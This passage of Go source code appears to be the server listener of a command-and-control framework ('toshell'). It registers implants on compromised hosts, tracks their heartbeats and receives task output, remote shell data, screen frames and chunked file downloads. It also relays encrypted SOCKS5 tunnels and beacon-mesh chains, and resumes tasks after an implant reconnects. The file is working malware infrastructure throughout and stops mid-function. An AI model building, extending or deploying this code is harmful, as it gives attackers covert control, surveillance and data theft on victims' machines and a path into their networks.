package listener

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"toshell/internal/common/crypto"
	"toshell/internal/common/protocol"
	"toshell/internal/common/tunnel"
	"toshell/internal/common/types"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
	"toshell/internal/server/session"
)

// ─── gost 风格缓冲区池 ────────────────────────────────────────────────────────────
// 对标 gost-master gost.go 四级池: 512B / 2KB / 8KB / 32KB
var (
	bufPool512 = sync.Pool{New: func() interface{} { b := make([]byte, 512); return &b }}
	bufPool2K  = sync.Pool{New: func() interface{} { b := make([]byte, 2048); return &b }}
	bufPool8K  = sync.Pool{New: func() interface{} { b := make([]byte, 8192); return &b }}
	bufPool32K = sync.Pool{New: func() interface{} { b := make([]byte, 32768); return &b }}
)

func getBuf(size int) []byte {
	var pool *sync.Pool
	switch {
	case size <= 512:
		pool = &bufPool512
	case size <= 2048:
		pool = &bufPool2K
	case size <= 8192:
		pool = &bufPool8K
	default:
		pool = &bufPool32K
	}
	return (*pool.Get().(*[]byte))[:size]
}

func putBuf(buf []byte) {
	c := cap(buf)
	var pool *sync.Pool
	switch {
	case c <= 512:
		pool = &bufPool512
	case c <= 2048:
		pool = &bufPool2K
	case c <= 8192:
		pool = &bufPool8K
	case c <= 32768:
		pool = &bufPool32K
	default:
		// 大缓冲区不回收
		return
	}
	pool.Put(&buf)
}

// ─── 帧标记：高位区分隧道/控制 ────────────────────────────────────────────────────

const (
	// 帧类型字节：位于 4B 长度前缀之后，区分控制帧（AES-GCM）与隧道帧（raw XOR）。
	// 不使用长度高位标记：高位置 1 会使长度值 ≥ 2^31，被中间代理（Nginx Lua/ACL
	// 等按 4B 长度前缀解析的网关）误判为超大包而吞帧/断连，表现为"控制帧通、隧道帧零响应"。
	frameTypeControl = 0x00
	frameTypeRaw     = 0x01

	// 上传直传分块：与植入端 fileChunkSize 对齐。单帧 1MB 数据 base64 后约 1.4MB，
	// 远低于 MaxPayloadSize(10MB) 与 maxFrameSize(16MB)。
	fileUpChunkSize = 1024 * 1024
)

// writeRequest is a control-message write request for the serialized writeLoop.
type writeRequest struct {
	conn   net.Conn
	packet *protocol.Packet
	done   chan error
}

// sessionWriter 单 goroutine 序列化写入。
//   - highQueue: 任务/ACK/Shell 等控制消息（AES-GCM 加密）
//   - writeMu:   保护 conn.Write，同时用于 raw 隧道帧的串行化
//   - 隧道数据通过 writeRaw() 直接写入，跳过队列和 AES-GCM
type sessionWriter struct {
	conn      net.Conn
	writeMu   sync.Mutex
	highQueue chan *writeRequest
	stopChan  chan struct{}
	wg        sync.WaitGroup
	sm4Key    []byte // SM4-CTR key for raw tunnel frames
}

// TaskEventCallback is called when a task result is received from implant.
type TaskEventCallback func(eventType string, taskID uint64, sessionID string, taskType string, exitCode int32, output string, errorMsg string)

type TCPListener struct {
	listener         net.Listener
	sessionMgr       *session.Manager
	taskMgr          TaskManager
	encryptor        *crypto.Encryptor
	encKey           []byte
	sm4Key           []byte // SM4-CTR 隧道子密钥（SHA-256 域分离派生）
	cfg              *config.ListenerConfig
	connections      sync.Map
	sessionByConn    sync.Map
	stopChan         chan struct{}
	stopOnce         sync.Once
	heartbeatTimeout time.Duration
	writers          sync.Map
	writeQueueSize   int
	onTaskResult     TaskEventCallback
	onSessionDead    func(sessionID string)
	onSessionOnline  func(info *types.SessionInfo)
	onScreenFrame    func(sessionID string, payload []byte)

	// 链式回连（Beacon Mesh）路由表
	relayMu      sync.RWMutex
	childRelay   map[string]relayRoute // childSessionID -> 中继路由
	relayToChild map[string]string     // "relaySessionID:routeID" -> childSessionID
	relayNodes   map[string]string     // 中继节点 sessionID -> 监听地址（供前端选择）
	// 注：隧道首帧诊断（[TUN] SVR first/total）已迁移至 SOCKS5Server（per-session）。
	// 原 map 挂在 TCPListener 上仅按 sid 键控，而 sid 每会话从 1 递增，
	// 跨会话会互相污染 first/total 统计，故移除以避免错乱。
}

func NewTCPListener(cfg *config.ListenerConfig, sessMgr *session.Manager, taskMgr TaskManager) (*TCPListener, error) {
	key := []byte(cfg.EncryptionKey)
	enc, err := crypto.NewAESEncryptor(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create encryptor: %w", err)
	}

	timeout := cfg.HeartbeatTimeout
	if timeout == 0 {
		timeout = 90 * time.Second
	}

	queueSize := 512
	if cfg.WriteQueueSize > 0 {
		queueSize = cfg.WriteQueueSize
	}

	return &TCPListener{
		sessionMgr:       sessMgr,
		taskMgr:          taskMgr,
		encryptor:        enc,
		encKey:           key,
		sm4Key:           crypto.DeriveSM4Key(key),
		cfg:              cfg,
		stopChan:         make(chan struct{}),
		heartbeatTimeout: timeout,
		writeQueueSize:   queueSize,
		childRelay:       make(map[string]relayRoute),
		relayToChild:     make(map[string]string),
		relayNodes:       make(map[string]string),
	}, nil
}

func (l *TCPListener) SetOnTaskResult(cb TaskEventCallback)       { l.onTaskResult = cb }
func (l *TCPListener) SetOnSessionDead(cb func(sessionID string)) { l.onSessionDead = cb }
func (l *TCPListener) SetOnSessionOnline(cb func(info *types.SessionInfo)) {
	l.onSessionOnline = cb
}
func (l *TCPListener) SetOnScreenFrame(cb func(sessionID string, payload []byte)) {
	l.onScreenFrame = cb
}

func (l *TCPListener) Start() error {
	host := l.cfg.Host
	if host == "" {
		host = "0.0.0.0"
	}
	addr := fmt.Sprintf("%s:%d", host, l.cfg.Port)

	// TLS 支持：listener.tls_enabled=true 且提供证书/密钥时启用 TLS 监听。
	// 植入端 build 时若回连地址带 https:// 或 wss:// 前缀，会使用 tls.Dial 与之握手，
	// 服务端/植入端双端必须保持一致（否则握手失败表现为"连不上"）。
	var listener net.Listener
	var err error
	if l.cfg.TLSEnabled && l.cfg.CertFile != "" && l.cfg.KeyFile != "" {
		cert, cerr := tls.LoadX509KeyPair(l.cfg.CertFile, l.cfg.KeyFile)
		if cerr != nil {
			return fmt.Errorf("failed to load TLS cert: %w", cerr)
		}
		tlsCfg := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}
		listener, err = tls.Listen("tcp", addr, tlsCfg)
		if err != nil {
			return fmt.Errorf("failed to start TLS listener: %w", err)
		}
		fmt.Printf("[INFO] [tcp-listener] TLS listener started on %s (heartbeat timeout: %v, gost raw tunnel)\n", addr, l.heartbeatTimeout)
	} else {
		listener, err = net.Listen("tcp", addr)
		if err != nil {
			return fmt.Errorf("failed to start TCP listener: %w", err)
		}
		fmt.Printf("[INFO] [tcp-listener] TCP listener started on %s (heartbeat timeout: %v, gost raw tunnel)\n", addr, l.heartbeatTimeout)
	}
	l.listener = listener
	go l.acceptLoop()
	go l.heartbeatChecker()
	return nil
}

func (l *TCPListener) Stop() {
	l.stopOnce.Do(func() {
		close(l.stopChan)
		l.writers.Range(func(key, value interface{}) bool {
			if sw, ok := value.(*sessionWriter); ok {
				// 安全加固：不直接 close(highQueue)（并发 queuePacketDirect 会
				// "send on closed channel" panic）。stopSessionWriter 通过 stopChan
				// 停止写循环并等待排空，写侧以 stopChan 为准退出。
				l.stopSessionWriter(sw)
			}
			l.writers.Delete(key)
			return true
		})
		if l.listener != nil {
			l.listener.Close()
		}
	})
}

// ─── 心跳检查 ─────────────────────────────────────────────────────────────────────

func (l *TCPListener) heartbeatChecker() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-l.stopChan:
			return
		case <-ticker.C:
			l.checkHeartbeats()
		}
	}
}

func (l *TCPListener) checkHeartbeats() {
	sessions := l.sessionMgr.List()
	now := time.Now()
	for _, sess := range sessions {
		if sess.Info.Status == "dead" {
			continue
		}
		if now.Sub(sess.LastSeen) > l.heartbeatTimeout {
			fmt.Printf("[INFO] [tcp-listener] Session %s timed out (last seen: %v ago)\n",
				sess.Info.ID, now.Sub(sess.LastSeen).Round(time.Second))
			sess.Info.Status = "dead"
			// 中继节点失联：从可选中继列表中移除
			l.relayMu.Lock()
			delete(l.relayNodes, sess.Info.ID)
			l.relayMu.Unlock()
			// 超时只标记 dead 并清理传输层；不在此处永久停 SOCKS5。
			// 植入体重连后 RefreshInfo 会恢复 active，已建隧道继续可用。
			if cur, ok := l.connections.Load(sess.Info.ID); ok {
				if c, ok := cur.(net.Conn); ok {
					l.releaseWriterForConn(sess.Info.ID, c)
					c.Close()
				}
				l.connections.Delete(sess.Info.ID)
			} else {
				l.releaseWriter(sess.Info.ID)
			}
			l.sessionMgr.ClearConnection(sess.Info.ID)
			if l.onSessionDead != nil {
				l.onSessionDead(sess.Info.ID)
			}
		} else {
			if sess.Info.Status != "active" {
				sess.Info.Status = "active"
			}
		}
	}
}

// ─── Accept ────────────────────────────────────────────────────────────────────────

func (l *TCPListener) acceptLoop() {
	for {
		select {
		case <-l.stopChan:
			return
		default:
			conn, err := l.listener.Accept()
			if err != nil {
				continue
			}
			go l.handleConnection(conn)
		}
	}
}

func (l *TCPListener) handleConnection(conn net.Conn) {
	defer conn.Close()

	fmt.Printf("[INFO] [tcp-listener] New TCP connection from %s\n", conn.RemoteAddr())

	// 兼容 TLS/TCP 两种底层连接：TLS 连接为 *tls.Conn，无法断言为 *net.TCPConn。
	// 使用安全断言，仅对真实 TCP 连接设置 socket 优化参数。
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
		tcpConn.SetNoDelay(true)
		// 放大 C2 链路 socket 缓冲（承载所有隧道数据的复用连接）。
		// 吞吐受 缓冲/RTT 限制，默认缓冲（Windows ~8KB）是窄管道；nps/frp 均在 bridge 上设大缓冲。
		tcpConn.SetReadBuffer(1024 * 1024)
		tcpConn.SetWriteBuffer(1024 * 1024)
	}

	// gost 风格：读缓冲区。隧道帧可能远大于初始缓冲，必须按需增长并完整读取，
	// 否则大帧(>缓冲)被跳过且未消费字节会导致整条连接流错位、传输卡死/损坏。
	readBuf := make([]byte, 256*1024)
	const maxFrameSize = 16 * 1024 * 1024 // 16MB 上限，防止异常长度打爆内存

	// 连接退出时按 conn 精确清理，避免重连竞态误关新 C2 连接。
	defer func() {
		sidVal, ok := l.sessionByConn.LoadAndDelete(conn)
		if !ok {
			return
		}
		sessionID := sidVal.(string)
		if cur, ok := l.connections.Load(sessionID); ok && cur == conn {
			l.connections.Delete(sessionID)
		}
		l.releaseWriterForConn(sessionID, conn)
		// 已无活跃连接时标记 dead；SOCKS5 是否停止由 onSessionDead 策略决定
		if _, alive := l.connections.Load(sessionID); !alive {
			l.sessionMgr.ClearConnection(sessionID)
			if l.onSessionDead != nil {
				l.onSessionDead(sessionID)
			}
		}
	}()

	for {
		select {
		case <-l.stopChan:
			return
		default:
			// 读 4B 长度（累积式：超时只重置 deadline，保留已读字节。
			// io.ReadFull 在超时时可能返回部分读取，若直接丢弃半帧，
			// 残留字节会与下一帧头拼接导致帧流永久错位、隧道数据损坏）。
			var lenBuf [4]byte
			var hdrGot int
			for hdrGot < len(lenBuf) {
				conn.SetReadDeadline(time.Now().Add(5 * time.Second))
				n, err := conn.Read(lenBuf[hdrGot:])
				hdrGot += n
				if err != nil {
					if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
						continue
					}
					fmt.Printf("[INFO] [tcp-listener] Connection closed: %v\n", err)
					return
				}
			}
			rawLen := binary.BigEndian.Uint32(lenBuf[:])
			if rawLen == 0 || rawLen > maxFrameSize {
				return // 非法帧长度，关闭连接
			}

			// 读 1B 帧类型
			var typeBuf [1]byte
			if !readFullNoDrop(conn, typeBuf[:]) {
				return
			}

			// ─── gost fast path: 隧道帧 (raw XOR) ───
			if typeBuf[0] == frameTypeRaw {
				length := rawLen
				if int(length) > len(readBuf) {
					readBuf = make([]byte, length) // 按需扩容
				}
				data := readBuf[:length]
				if !readFullNoDrop(conn, data) {
					return
				}
				// SM4-CTR 解密（剥离 16B IV 后原地解密）→ dispatch tunnel data
				data = l.decryptTunnel(data)
				l.handleTunnelRaw(conn, data)
				continue
			}

			// ─── 控制帧: AES-GCM ───
			length := rawLen
			data := make([]byte, length)
			if !readFullNoDrop(conn, data) {
				return
			}

			packet, err := l.parsePacketFromData(data)
			if err != nil {
				continue
			}
			l.handlePacket(conn, packet)
		}
	}
}

// readFullNoDrop 累积式读满 buf：每次读前重置 5s deadline，超时仅继续（保留已读字节），
// 杜绝 io.ReadFull 超时半帧丢弃导致的帧流错位（隧道数据损坏 / ERR_SSL_PROTOCOL_ERROR）。
func readFullNoDrop(conn net.Conn, buf []byte) bool {
	got := 0
	for got < len(buf) {
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		n, err := conn.Read(buf[got:])
		got += n
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			return false
		}
	}
	return true
}

// ─── 帧读写 ────────────────────────────────────────────────────────────────────────

func (l *TCPListener) parsePacketFromData(data []byte) (*protocol.Packet, error) {
	decrypted, err := l.encryptor.Decrypt(data)
	if err != nil {
		return nil, err
	}
	decompressed, err := decompressData(decrypted)
	if err != nil {
		return nil, err
	}
	return parsePacket(decompressed)
}

// handleTunnelRaw 分发 raw 隧道帧（已 XOR 解码）。
// 对标 gost transport()：一帧 = 一条隧道消息，无批量循环、无内层 [4B pktLen] 包装。
// rawData 格式：[1B op][4B sid][4B dataLen][N data]  → DecodeTunnelPacket 兼容。
func (l *TCPListener) handleTunnelRaw(conn net.Conn, rawData []byte) {
	sid, ok := l.sessionByConn.Load(conn)
	if !ok {
		return
	}
	sess, err := l.sessionMgr.Get(sid.(string))
	if err != nil || sess == nil {
		return
	}
	sess.LastSeen = time.Now()
	sess.Info.LastSeen = time.Now()

	tp, err := tunnel.DecodeTunnelPacket(rawData)
	if err == nil && tp != nil {
		// 注意：这里不再对 tp.Data 深拷贝。原因：
		//   1. DispatchTunnelData 现在同步派发（见 session.go），HandleTunnelData 在
		//      readLoop 读下一帧、覆盖 readBuf 之前就返回；
		//   2. HandleTunnelData → WriteToClient 在入队前已对数据做一次拷贝（cp），
		//      彻底切断与 readBuf 的别名关系。
		// 因此此处深拷贝是冗余的，去掉它可省去每帧一次 make+copy 的分配与 GC 压力。
		// [TUN] SVR 诊断日志已迁移至 SOCKS5Server.HandleTunnelData（per-session），
		// 避免跨会话 sid 碰撞污染 first/total 统计。
		sess.DispatchTunnelData(tp)
	} else if err != nil {
		fmt.Printf("[TUN] decode fail len=%d err=%v\n", len(rawData), err)
	}
}

// ─── sessionWriter ─────────────────────────────────────────────────────────────────

func (l *TCPListener) createWriter(sessionID string, conn net.Conn) *sessionWriter {
	sw := &sessionWriter{
		conn:      conn,
		highQueue: make(chan *writeRequest, l.writeQueueSize),
		stopChan:  make(chan struct{}),
		sm4Key:    l.sm4Key,
	}
	sw.wg.Add(1)
	go sw.writeLoop(l.encryptor)
	l.writers.Store(sessionID, sw)
	return sw
}

func (l *TCPListener) getWriter(sessionID string) (*sessionWriter, bool) {
	if value, ok := l.writers.Load(sessionID); ok {
		return value.(*sessionWriter), true
	}
	return nil, false
}

func (l *TCPListener) closeWriter(sessionID string) {
	l.releaseWriter(sessionID)
	// 仅当该 session 当前已无活跃 C2 连接时，才视为真正断连。
	// 重连竞态下旧连接退出时新连接可能已就位，绝不能误杀 SOCKS5。
	if _, alive := l.connections.Load(sessionID); alive {
		return
	}
	if l.onSessionDead != nil {
		l.onSessionDead(sessionID)
	}
}

// releaseWriter 清理 writer 及其底层连接，但不触发 onSessionDead。
// 用于 C2 重连替换等场景：只替换传输层状态，保留 SOCKS5 代理等上层资源。
func (l *TCPListener) releaseWriter(sessionID string) {
	if value, ok := l.writers.LoadAndDelete(sessionID); ok {
		sw := value.(*sessionWriter)
		l.stopSessionWriter(sw)
	}
}

// releaseWriterForConn 仅当 session 当前 writer 仍绑定本 conn 时才清理。
// 解决重连竞态：旧 handleConnection 退出时，新连接的 writer 已被 createWriter 装上，
// 若无条件 LoadAndDelete 会把新 writer/conn 关掉 → 植入体立刻 EOF → SOCKS5 被误停。
func (l *TCPListener) releaseWriterForConn(sessionID string, conn net.Conn) {
	value, ok := l.writers.Load(sessionID)
	if !ok {
		return
	}
	sw := value.(*sessionWriter)
	if sw.conn != conn {
		return
	}
	if !l.writers.CompareAndDelete(sessionID, value) {
		return
	}
	l.stopSessionWriter(sw)
}

func (l *TCPListener) stopSessionWriter(sw *sessionWriter) {
	if sw == nil {
		return
	}
	if sw.conn != nil {
		sw.conn.Close() // 唤醒阻塞中的读写，确保 wg.Wait 不卡死
	}
	select {
	case <-sw.stopChan:
		// already closed
	default:
		close(sw.stopChan)
	}
	// highQueue 可能已被关闭；写侧以 stopChan 为准退出
	sw.wg.Wait()
}

// writeRaw 对标 gost transport() 的 io.Copy 直接写入：
// 隧道数据 → SM4-CTR 加密(随机16B IV + 密文) → 4B 长度帧 + 1B 帧类型 → conn.Write。
// 不走队列，不带 AES-GCM，最小化热路径开销。
func (sw *sessionWriter) writeRaw(data []byte) error {
	// SM4-CTR 加密：返回 [16B IV][密文]，长度 +16
	enc, err := crypto.SM4EncryptTunnel(data, sw.sm4Key)
	if err != nil {
		return err
	}
	data = enc

	sw.writeMu.Lock()
	defer sw.writeMu.Unlock()

	if tcpConn, ok := sw.conn.(*net.TCPConn); ok {
		tcpConn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	}

	// 写 4B 真实长度 + 1B 帧类型 + data（长度前缀不使用高位标记）
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(data)))
	var typeBuf [1]byte = [1]byte{frameTypeRaw}

	// 一次 writev 合并长度、类型和数据
	buf := net.Buffers{lenBuf[:], typeBuf[:], data}
	_, err = buf.WriteTo(sw.conn)
	return err
}

// writeLoop 只处理控制消息（highQueue）。隧道数据已走 writeRaw 快速路径。
func (sw *sessionWriter) writeLoop(encryptor *crypto.Encryptor) {
	defer sw.wg.Done()

	for {
		select {
		case <-sw.stopChan:
			sw.drainHigh(encryptor)
			return
		case req, ok := <-sw.highQueue:
			if !ok || req == nil {
				return
			}
			sw.writeMu.Lock()
			err := sw.writeControl(encryptor, req)
			sw.writeMu.Unlock()
			if err != nil {
				return
			}
		}
	}
}

func (sw *sessionWriter) drainHigh(encryptor *crypto.Encryptor) {
	for {
		select {
		case req, ok := <-sw.highQueue:
			if !ok || req == nil {
				return
			}
			sw.writeControl(encryptor, req)
			if req.done != nil {
				req.done <- errors.New("writer stopped")
			}
		default:
			return
		}
	}
}

// writeControl 写入控制帧（AES-GCM 加密）
func (sw *sessionWriter) writeControl(encryptor *crypto.Encryptor, req *writeRequest) error {
	data := encodePacket(req.packet)
	compressed, cerr := compress(data)
	if cerr != nil {
		if req.done != nil {
			req.done <- cerr
		}
		return cerr
	}
	encrypted, eerr := encryptor.Encrypt(compressed)
	if eerr != nil {
		if req.done != nil {
			req.done <- eerr
		}
		return eerr
	}

	if tcpConn, ok := sw.conn.(*net.TCPConn); ok {
		tcpConn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	}

	// 合并 4B 长度 + 1B 帧类型 + 加密体
	buf := make([]byte, 5+len(encrypted))
	binary.BigEndian.PutUint32(buf[:4], uint32(len(encrypted)))
	buf[4] = frameTypeControl
	copy(buf[5:], encrypted)

	_, err := sw.conn.Write(buf)
	if req.done != nil {
		req.done <- err
	}
	return err
}

// ─── 写入队列（控制消息） ──────────────────────────────────────────────────────────

// queuePacket 发送控制帧：目标若经中继链（多跳）则递归包装成 TypeRelay 帧转发。
func (l *TCPListener) queuePacket(sessionID string, packet *protocol.Packet, wait bool) error {
	return l.sendOrQueue(sessionID, packet, wait, 0)
}

// queuePacketDirect 直连会话的控制帧写入（无中继路由）。
func (l *TCPListener) queuePacketDirect(sessionID string, packet *protocol.Packet, wait bool) error {
	sw, ok := l.getWriter(sessionID)
	if !ok {
		return fmt.Errorf("no writer for session %s", sessionID)
	}

	// 隧道包不应该走这里
	if packet.Type == protocol.TypeTunnel {
		return fmt.Errorf("tunnel packets must use writeRaw path")
	}

	req := &writeRequest{
		conn:   sw.conn,
		packet: packet,
	}

	if wait {
		req.done = make(chan error, 1)
	}

	select {
	case sw.highQueue <- req:
		if wait {
			select {
			case err := <-req.done:
				return err
			case <-sw.stopChan:
				return fmt.Errorf("writer stopped")
			case <-time.After(10 * time.Second):
				return fmt.Errorf("write timeout")
			}
		}
		return nil
	default:
		if !wait {
			return fmt.Errorf("write queue full for session %s", sessionID)
		}
	}

	// 阻塞入队
	timer := time.NewTimer(30 * time.Second)
	defer timer.Stop()
	select {
	case sw.highQueue <- req:
		select {
		case err := <-req.done:
			return err
		case <-sw.stopChan:
			return fmt.Errorf("writer stopped")
		case <-time.After(10 * time.Second):
			return fmt.Errorf("write timeout")
		}
	case <-sw.stopChan:
		return fmt.Errorf("writer stopped")
	case <-timer.C:
		return fmt.Errorf("write queue congested for session %s", sessionID)
	}
}

// ─── 包处理 ────────────────────────────────────────────────────────────────────────

func (l *TCPListener) handlePacket(conn net.Conn, packet *protocol.Packet) {
	switch packet.Type {
	case protocol.TypeRegister:
		l.handleRegister(conn, packet)
	case protocol.TypeHeartbeat:
		l.handleHeartbeat(conn, packet)
	case protocol.TypeResult:
		l.handleResult(conn, packet)
	case protocol.TypeShellData:
		l.handleShellData(conn, packet)
	case protocol.TypeTunnel:
		l.handleTunnelData(conn, packet) // 仅兼容旧植入端 AES-GCM 隧道包
	case protocol.TypeFileDown:
		l.handleFileDown(conn, packet)
	case protocol.TypeScreenFrame:
		l.handleScreenFrame(conn, packet)
	case protocol.TypeRelay:
		l.handleRelay(conn, packet)
	case protocol.TypeRelayStatus:
		l.handleRelayStatus(conn, packet)
	}
}

// fileDownChunk 大文件分块直传的数据块
type fileDownChunk struct {
	TransferID string `json:"transfer_id"`
	Filename   string `json:"filename"`
	Size       int64  `json:"size"`
	Offset     int64  `json:"offset"`
	Done       bool   `json:"done"`
	Data       string `json:"data"`
	TaskID     uint64 `json:"task_id,omitempty"`
}

// handleFileDown 接收植入端大文件分块并写入 data/transfers/<sessionID>/<transferID>
// 注意：此前所有失败路径都是静默丢弃，导致「任务完成但文件缺失（前端 404）」时
// 无法从日志定位根因。此处补全错误日志，并在 done 块校验主文件完整性。
func (l *TCPListener) handleFileDown(conn net.Conn, packet *protocol.Packet) {
	var chunk fileDownChunk
	if err := json.Unmarshal(packet.Payload, &chunk); err != nil {
		logging.Warn("listener", "fileDown: bad chunk json: %v", err)
		return
	}

	sid := fmt.Sprintf("%x", packet.ID)

	if _, err := processFileDownChunk(sid, chunk); err != nil {
		logging.Error("listener", "fileDown: %v", err)
		return
	}

	// 落盘成功后才记录断点进度（重连续传用），状态挂全局 task.Manager
	// （listener 实例会随 stop/start 重建，断点必须跨实例存活）
	if l.taskMgr != nil && chunk.TaskID > 0 {
		if chunk.Done {
			l.taskMgr.ClearTransfer(chunk.TaskID)
		} else if n, ok := decodedLen(chunk.Data); ok {
			l.taskMgr.TrackTransfer(chunk.TaskID, chunk.TransferID, chunk.Size, chunk.Offset+int64(n))
		}
	}

	// 进度更新：offset+len / size（每块更新一次）
	if chunk.TaskID > 0 && chunk.Size > 0 && l.taskMgr != nil {
		if chunk.Done {
			_ = l.taskMgr.UpdateProgress(chunk.TaskID, 100)
		} else if n, ok := decodedLen(chunk.Data); ok {
			written := chunk.Offset + int64(n)
			pct := int(written * 100 / chunk.Size)
			if pct > 99 {
				pct = 99 // 完成由 done 块置 100
			}
			_ = l.taskMgr.UpdateProgress(chunk.TaskID, pct)
		}
	}
}

// decodedLen 返回 base64 字符串解码后的字节数（不实际解码）。
func decodedLen(b64 string) (int, bool) {
	n := len(b64)
	if n == 0 || n%4 != 0 {
		return 0, false
	}
	padding := 0
	if b64[n-1] == '=' {
		padding++
	}
	if n >= 2 && b64[n-2] == '=' {
		padding++
	}
	return n/4*3 - padding, true
}

func (l *TCPListener) handleRegister(conn net.Conn, packet *protocol.Packet) {
	reg, err := unmarshalRegister(packet.Payload)
	if err != nil {
		return
	}
	sessionID := fmt.Sprintf("%x", packet.ID)
	sess := buildSessionInfo(packet, reg, "tcp", l.cfg.ID, conn.RemoteAddr().String())
	if err := l.sessionMgr.Add(sess); err != nil {
		// 会话已存在（C2 重连场景）：
		// 保留原 Session 对象及其上层状态（tunnelHandler/shellHandlers），
		// 仅刷新注册信息并替换传输层（writer/连接）。
		// 注意：严禁 Remove+Add 重建 Session —— 新对象 tunnelHandler 为 nil，
		// 已建 SOCKS5 代理的上行隧道数据会被 DispatchTunnelData 静默丢弃，
		// 表现为 HTTPS 站点 ERR_SSL_PROTOCOL_ERROR / 连接挂起。
		existing, gerr := l.sessionMgr.Get(sessionID)
		if gerr == nil && existing != nil {
			sess.RemoteAddr = conn.RemoteAddr().String()
			sess.LastSeen = time.Now()
			_ = l.sessionMgr.RefreshInfo(sessionID, sess)
		} else {
			// 注册表不一致的极端兜底：清理后重建
			_ = l.sessionMgr.Remove(sessionID)
			if err := l.sessionMgr.Add(sess); err != nil {
				fmt.Printf("[ERROR] [tcp-listener] Failed to add session: %v\n", err)
				conn.Close()
				return
			}
		}
	} else if l.onSessionOnline != nil {
		// 新会话上线：触发 webhook 通知（仅首次注册，重连不重复通知）
		l.onSessionOnline(sess)
	}
	// 先绑定新连接映射，再释放“仍指向旧 conn”的 writer。
	// 顺序很重要：若先 releaseWriter 再 Store，并发旧连接退出可能把状态清乱。
	l.sessionMgr.SetConnection(sessionID, conn)
	l.connections.Store(sessionID, conn)
	l.sessionByConn.Store(conn, sessionID)
	// 仅替换旧 writer；createWriter 内部会覆盖 writers map
	if old, ok := l.writers.Load(sessionID); ok {
		oldSw := old.(*sessionWriter)
		if oldSw.conn != conn {
			if l.writers.CompareAndDelete(sessionID, old) {
				// 异步停旧 writer，避免在注册热路径上 wg.Wait 卡住新连接
				go l.stopSessionWriter(oldSw)
			}
		}
	}
	l.createWriter(sessionID, conn)

	fmt.Printf("[INFO] [tcp-listener] Implant registered: %s (%s@%s)\n", sessionID, reg.Username, reg.Hostname)

	// 会话热迁移（重连续传）：重连后补发在途任务。
	// 大文件下载若有断点（服务端已收部分分块，断点状态存全局 task.Manager），
	// 下发 resume 任务续传；其余 pending/sent 任务原样重推，
	// 植入端按 task ID 去重（结果缓存回放）。
	replayed := replaySessionTasks(l.taskMgr, l, l, sessionID)
	if replayed > 0 {
		fmt.Printf("[INFO] [tcp-listener] Hot-migrate: replayed %d in-flight task(s) for session %s\n", replayed, sessionID)
	}

	ack := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        packet.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(`{"status":"registered"}`),
	}
	l.queuePacket(sessionID, ack, false)
}

func (l *TCPListener) handleHeartbeat(conn net.Conn, packet *protocol.Packet) {
	sessionID := fmt.Sprintf("%x", packet.ID)
	sess, err := l.sessionMgr.Get(sessionID)
	if err == nil && sess != nil {
		now := time.Now()
		sess.LastSeen = now
		sess.Info.LastSeen = now
		// 仅当心跳来自当前绑定连接时才刷新连接绑定，
		// 防止重连期间旧连接残留的心跳把 session.Conn 覆盖回已关闭的连接。
		if cur, ok := l.connections.Load(sessionID); ok {
			if curConn, isNetConn := cur.(net.Conn); isNetConn && curConn == conn {
				l.sessionMgr.SetConnection(sessionID, conn)
			}
		}
	}
	ack := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        packet.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(`{"status":"ok"}`),
	}
	l.queuePacket(sessionID, ack, false)
}

func (l *TCPListener) handleResult(conn net.Conn, packet *protocol.Packet) {
	var result protocol.Result
	if err := json.Unmarshal(packet.Payload, &result); err != nil {
		return
	}
	sessionID := fmt.Sprintf("%x", packet.ID)
	sess, err := l.sessionMgr.Get(sessionID)
	if err == nil && sess != nil {
		now := time.Now()
		sess.LastSeen = now
		sess.Info.LastSeen = now
	}
	fmt.Printf("[INFO] [tcp-listener] Task %d completed: exit_code=%d\n", result.TaskID, result.ExitCode)
	if l.taskMgr != nil {
		if result.ExitCode == 0 && result.Error == "" {
			l.taskMgr.Complete(result.TaskID, result.ExitCode, result.Output, result.Error)
		} else {
			errMsg := result.Error
			if errMsg == "" && result.ExitCode != 0 {
				errMsg = fmt.Sprintf("exit code %d", result.ExitCode)
			}
			l.taskMgr.Fail(result.TaskID, errMsg)
		}
	}
	if l.onTaskResult != nil {
		taskType := result.TaskType
		if taskType == "" && l.taskMgr != nil {
			if ti, err := l.taskMgr.Get(result.TaskID); err == nil && ti != nil {
				taskType = ti.TaskType
			}
		}
		eventType := "task_completed"
		if result.Error != "" || result.ExitCode != 0 {
			eventType = "task_failed"
		}
		l.onTaskResult(eventType, result.TaskID, sessionID, taskType, result.ExitCode, result.Output, result.Error)
	}
}

func (l *TCPListener) handleShellData(conn net.Conn, packet *protocol.Packet) {
	sessionID := fmt.Sprintf("%x", packet.ID)
	var data struct {
		Data string `json:"data"`
		CWD  string `json:"cwd"`
	}
	if err := json.Unmarshal(packet.Payload, &data); err != nil {
		return
	}
	sess, err := l.sessionMgr.Get(sessionID)
	if err != nil || sess == nil {
		return
	}
	sess.LastSeen = time.Now()
	sess.Info.LastSeen = time.Now()
	if data.CWD != "" {
		// 交互式 shell 上报了当前工作目录，仅在变化时推送前端
		sess.SetShellCWD(data.CWD)
	}
	sess.DispatchShellOutput([]byte(data.Data))
}

func (l *TCPListener) handleTunnelData(conn net.Conn, packet *protocol.Packet) {
	sessionID := fmt.Sprintf("%x", packet.ID)
